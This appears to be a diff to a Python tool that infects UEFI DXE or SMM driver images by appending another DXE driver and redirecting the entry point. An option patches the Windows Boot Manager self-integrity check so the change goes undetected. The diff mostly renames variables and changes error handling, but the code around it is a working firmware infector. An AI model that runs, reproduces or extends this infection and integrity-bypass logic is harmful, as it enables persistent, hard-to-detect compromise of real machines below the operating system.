@@ -51,11 +51,9 @@ def patch_win_boot_mgr_integrity(data):
             # patch the function to disable self check
             return data[: i] + patch + data[i + len(patch) :]
 
-    print('ERROR: Unable to find bootmgr!BmFwVerifySelfIntegrity() function')
+    raise Exception('Unable to find bootmgr!BmFwVerifySelfIntegrity() function')
 
-    return None
-
-def infect(src, payload, dst = None, patch_integrity = False):
+def infect(src, dxe_driver, dst = None, patch_integrity = False):
 
     try:
 
@@ -63,14 +61,13 @@ def infect(src, payload, dst = None, patch_integrity = False):
 
     except ImportError:
 
-        print('ERROR: pefile is not installed')
-        exit(-1)
+        raise ImportError('pefile is not installed')
 
     def _infector_config_offset(pe):
         
         for section in pe.sections:
 
-            # find .conf section of payload image
+            # find .conf section of DXE driver image
             if section.Name[: len(INFECTOR_CONFIG_SECTION)] == INFECTOR_CONFIG_SECTION:
 
                 return section.PointerToRawData
@@ -92,24 +89,24 @@ def infect(src, payload, dst = None, patch_integrity = False):
                data[offs + INFECTOR_CONFIG_LEN :]
 
     # load target image
-    pe_src = pefile.PE(src)
-
-    # load payload image
-    pe_payload = pefile.PE(payload)
+    pe_src = pefile.PE(src)    
     
     if pe_src.DOS_HEADER.e_res == INFECTOR_SIGN:
 
         raise Exception('%s is already infected' % src)        
 
-    if pe_src.FILE_HEADER.Machine != pe_payload.FILE_HEADER.Machine:
+    # load DXE driver image
+    pe_dxe = pefile.PE(dxe_driver)
+
+    if pe_src.FILE_HEADER.Machine != pe_dxe.FILE_HEADER.Machine:
 
         raise Exception('Architecture missmatch')
 
-    # read payload image data into the string
-    data = open(payload, 'rb').read()
+    # get DXE driver image data
+    data = pe_dxe.write()
 
-    # read _INFECTOR_CONFIG, this structure is located at .conf section of payload image
-    val_1, val_2, val_3, conf_ep_new, conf_ep_old = _infector_config_get(pe_payload, data) 
+    # read _INFECTOR_CONFIG, this structure is located at .conf section of DXE driver image
+    val_1, val_2, val_3, conf_ep_new, conf_ep_old = _infector_config_get(pe_dxe, data) 
 
     last_section = None
     for section in pe_src.sections:
@@ -132,8 +129,8 @@ def infect(src, payload, dst = None, patch_integrity = False):
 
     print('Original image size is 0x%.8x' % pe_src.OPTIONAL_HEADER.SizeOfImage)
 
-    # write updated _INFECTOR_CONFIG back to the payload image
-    data = _infector_config_set(pe_payload, data, val_1, val_2, val_3, conf_ep_new, conf_ep_old)
+    # write updated _INFECTOR_CONFIG back to the DXE driver image
+    data = _infector_config_set(pe_dxe, data, val_1, val_2, val_3, conf_ep_new, conf_ep_old)
 
     # add padding
     data += '\0' * (align_up(len(data), pe_src.OPTIONAL_HEADER.FileAlignment) - len(data))
@@ -171,10 +168,6 @@ def infect(src, payload, dst = None, patch_integrity = False):
 
         # patch self-integrity checks of windows boot manager
         data = patch_win_boot_mgr_integrity(str(data))
-        if data is None:
-
-            # error occurred
-            return None
 
     if dst is not None:
 
@@ -192,8 +185,8 @@ def main():
         make_option('-i', '--infect', dest = 'infect', default = None,
             help = 'infect existing DXE, SMM or combined driver image'),
 
-        make_option('-p', '--payload', dest = 'payload', default = None,
-            help = 'infect payload path'),
+        make_option('-d', '--dxe-driver', dest = 'dxe_driver', default = None,
+            help = 'DXE driver image path'),
 
         make_option('-o', '--output', dest = 'output', default = None,
             help = 'file path to save infected file'),
@@ -207,13 +200,13 @@ def main():
 
     if options.infect is not None:
 
-        if options.payload is None:
+        if options.dxe_driver is None:
 
-            print('ERROR: --payload must be specified')
+            print('ERROR: --dxe-driver must be specified')
             return -1
 
         print('[+] Target image to infect: %s' % options.infect)
-        print('[+] Infector payload: %s' % options.payload)
+        print('[+] DXE driver: %s' % options.dxe_driver)
 
         if options.output is None:
 
@@ -227,11 +220,17 @@ def main():
 
         print('[+] Output file: %s' % options.output)
 
-        # infect source file with specified payload
-        if infect(options.infect, options.payload, 
-                  dst = options.output, patch_integrity = options.patch_integrity) is not None:
+        try:
 
-            print('[+] DONE')
+            # infect source file with specified DXE driver
+            if infect(options.infect, options.dxe_driver, 
+                      dst = options.output, patch_integrity = options.patch_integrity) is not None:
+
+                print('[+] DONE')
+
+        except Exception, why:
+
+            print('ERROR: %s' % str(why))
 
         return 0
 
